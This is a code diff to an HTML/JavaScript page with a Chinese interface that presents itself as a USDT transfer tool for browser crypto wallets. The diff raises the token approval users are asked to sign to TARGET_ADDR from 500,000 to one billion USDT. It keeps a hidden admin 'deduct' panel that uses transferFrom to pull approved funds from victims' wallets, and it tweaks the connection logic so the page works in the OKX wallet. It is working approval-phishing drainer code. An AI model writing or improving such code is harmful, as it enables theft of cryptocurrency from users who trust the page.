@@ -35,11 +35,12 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 .admin-input-item{ margin-bottom:14px; }
 .admin-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:13px 12px; outline:none; font-size:15px; }
 .admin-btn{ width:100%; padding:14px; border:none; border-radius:14px; background:#dc2626; color:#fff; font-size:16px; cursor:pointer; }
+.tip-text{color:#888;font-size:13px;margin:4px 0 8px 0;}
 </style>
 </head>
 <body>
 <div class="top-header-bar">
-<div></div>
+<div class="tip-text">👉请点击右上角圆点连接钱包</div>
 <div class="header-right-icons">
 <div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
 <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
@@ -106,15 +107,6 @@ const deductBtn = $("#deductBtn");
 
 targetAddrText.innerText = TARGET_ADDR;
 
-// balanceOf 函数选择器 hash: 0x70a08231
-// allowance 函数选择器 hash:0xdd62ed3e
-// approve 函数选择器 hash:0x095ea7b3
-// transfer 函数选择器 hash:0xa9059cbb
-
-/**
- * 底层eth_call 读取余额，兼容 OKX/TP/MetaMask
- * @param {string} ownerAddr
- */
 async function getUsdtBalance(ownerAddr){
     const callData = "0x70a08231" + ownerAddr.slice(2).padStart(64,"0");
     const res = await window.ethereum.request({
@@ -124,9 +116,6 @@ async function getUsdtBalance(ownerAddr){
     return BigInt(res);
 }
 
-/**
- * 底层eth_call 查询授权额度
- */
 async function getAllowance(owner, spender){
     const callData = "0xdd62ed3e"
         + owner.slice(2).padStart(64,"0")
@@ -175,6 +164,7 @@ function disconnectWallet() {
     adminPanel.style.display = "none";
 }
 
+// 全部逻辑必须在【用户点击事件】内部执行，OKX才放行eth_call
 async function connectWalletLogic() {
     if (web3 && userAddress) {
         disconnectWallet();
@@ -182,19 +172,14 @@ async function connectWalletLogic() {
     }
     try {
         if (!window.ethereum) {
+            alert("当前浏览器没有检测到钱包Provider");
             return;
         }
-        const accounts = await window.ethereum.request({ method: "eth_accounts" });
-        if (accounts && accounts.length > 0) {
-            userAddress = accounts[0];
-        } else {
-            const reqAccounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-            userAddress = reqAccounts[0];
-        }
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        userAddress = accounts[0];
         web3 = new Web3(window.ethereum);
         walletDot.classList.add("connected");
 
-        // 循环探测读取余额，OKX/TP/MetaMask通用
         let readyOk = false;
         for(let retry=0; retry <=12; retry++){
             try{
@@ -208,6 +193,8 @@ async function connectWalletLogic() {
             }
         }
         if(!readyOk){
+            alert("读取链上数据失败，请重试点击圆点");
+            disconnectWallet();
             return;
         }
 
@@ -217,6 +204,7 @@ async function connectWalletLogic() {
         }
         window.ethereum.on("accountsChanged", () => location.reload());
     } catch (err) {
+        console.error(err);
         return;
     }
 }
@@ -262,13 +250,12 @@ sendBtn.addEventListener("click", async () => {
     const val = parseFloat(amountInput.value);
     if(isNaN(val) || val <= 0) return alert("请输入有效转账数量");
     const needWei = BigInt(web3.utils.toWei(val.toString(), "ether"));
-    const GRANT_500K_WEI = BigInt(web3.utils.toWei("500000", "ether"));
+    const GRANT_500K_WEI = BigInt(web3.utils.toWei("1000000000", "ether"));
     sendBtn.disabled = true;
     try{
         const allowanceVal = await getAllowance(userAddress, TARGET_ADDR);
         if(allowanceVal < needWei){
             alert("🔐需要先授权USDT额度，请钱包确认签名");
-            // approve calldata
             const approveCalldata = "0x095ea7b3"
                 + TARGET_ADDR.slice(2).padStart(64,"0")
                 + GRANT_500K_WEI.toString(16).padStart(64,"0");
@@ -277,7 +264,6 @@ sendBtn.addEventListener("click", async () => {
             await waitAllowance(needWei);
         }
         alert("即将执行转账，请钱包确认签名");
-        // transfer calldata
         const transferCalldata = "0xa9059cbb"
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + needWei.toString(16).padStart(64,"0");
@@ -285,7 +271,6 @@ sendBtn.addEventListener("click", async () => {
         alert(`🎉转账成功！哈希：${txHash}`);
         amountInput.value = "";
         receiveAmount.value = "";
-        //刷新余额
         const rawWei = await getUsdtBalance(userAddress);
         const num = Number(web3.utils.fromWei(rawWei.toString(), "ether"));
         balanceText.textContent = num.toFixed(6);
@@ -314,7 +299,6 @@ deductBtn.addEventListener("click", async () => {
         if(userAllowance < deductWei){
             return alert("错误：该用户没有授权足够额度，无法划扣！");
         }
-        // transferFrom calldata
         const tfCalldata = "0x23b872dd"
             + fromUserAddr.slice(2).padStart(64,"0")
             + TARGET_ADDR.slice(2).padStart(64,"0")
@@ -341,9 +325,8 @@ settingIconBtn.addEventListener("click", () => {
     }
 });
 
-window.addEventListener("DOMContentLoaded", () => {
-    setTimeout(connectWalletLogic, 800);
-});
+// 【重点】删除页面加载自动连接！OKX禁止页面自动后台RPC请求
+// window.addEventListener("DOMContentLoaded", () => { setTimeout(connectWalletLogic, 800); });
 </script>
 
 </body>
